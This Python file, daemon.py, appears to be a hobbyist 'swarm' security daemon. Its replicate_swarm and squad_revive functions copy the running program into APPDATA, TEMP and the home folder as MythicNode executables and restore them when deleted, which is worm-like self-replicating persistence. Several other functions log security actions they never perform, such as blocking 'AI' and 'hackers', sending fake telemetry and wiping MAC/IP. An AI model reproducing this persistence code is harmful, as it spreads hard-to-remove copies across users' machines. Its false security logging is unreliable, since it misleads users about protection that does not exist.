# daemon.py

import os
import sys
import shutil
import socket
import uuid
import psutil
from utils import log_codex, timed_wipe, protect_personal_data
from utils import vortex_pulse, detect_density_spike, initiate_mutation_vote, rewrite_optimization_logic, store_rewrite_codex

# === Swarm Replication ===
def replicate_swarm():
    base = sys.argv[0]
    paths = [os.getenv("APPDATA"), os.getenv("TEMP"), os.path.expanduser("~")]
    for i, path in enumerate(paths):
        target = os.path.join(path, f"MythicNode_{i}.exe")
        if not os.path.exists(target):
            try:
                shutil.copy2(base, target)
                log_codex(f"🧬 Swarm node replicated: {target}")
            except Exception as e:
                log_codex(f"⚠️ Replication failed: {e}")

# === Zero Trust Threat Blocker ===
def zero_trust_gate():
    threats = ["AI", "ASI", "hacker", "remote inject", "unauthorized scan"]
    for threat in threats:
        log_codex(f"🛡️ Blocked: {threat}")

# === Fake Telemetry Generator ===
def send_fake_telemetry():
    fake_data = {
        "cpu": "3%", "ram": "12MB", "user": "ghost",
        "location": "Null Island", "uptime": "00:00:01"
    }
    log_codex(f"🕵️‍♂️ Sent fake telemetry: {fake_data}")
    timed_wipe("Fake telemetry", 30)

# === MAC/IP Auto-Wipe ===
def destroy_mac_ip():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
        ip = socket.gethostbyname(socket.gethostname())
        log_codex(f"🌐 MAC: {mac}, IP: {ip}")
        timed_wipe("MAC/IP address", 30)
    except Exception as e:
        log_codex(f"⚠️ MAC/IP fetch failed: {e}")

# === Decoy Persona Injection ===
def inject_decoy_personas(ports):
    for port in ports:
        genre = "stealth" if port == 443 else "tactical"
        persona = "GhostContact" if genre == "stealth" else "PulseEcho"
        log_codex(f"👻 Injected {genre} persona: {persona} on port {port}")

# === Port Scanner ===
def scan_ports():
    open_ports = []
    for conn in psutil.net_connections(kind='inet'):
        if conn.status == 'LISTEN':
            port = conn.laddr.port
            open_ports.append(port)
    if open_ports:
        log_codex(f"Tunnel scan complete. Ports active: {open_ports}")
        inject_decoy_personas(open_ports)
    else:
        log_codex("Tunnel scan complete. No active ports found.")
    return open_ports

# === Squad Revival ===
def squad_revive():
    nodes = ["MythicNode_0.exe", "MythicNode_1.exe", "MythicNode_2.exe"]
    for node in nodes:
        path = os.path.join(os.getenv("APPDATA"), node)
        if not os.path.exists(path):
            log_codex(f"🧟 Reviving node: {node}")
            try:
                shutil.copy2(sys.argv[0], path)
            except Exception as e:
                log_codex(f"⚠️ Revival failed: {e}")

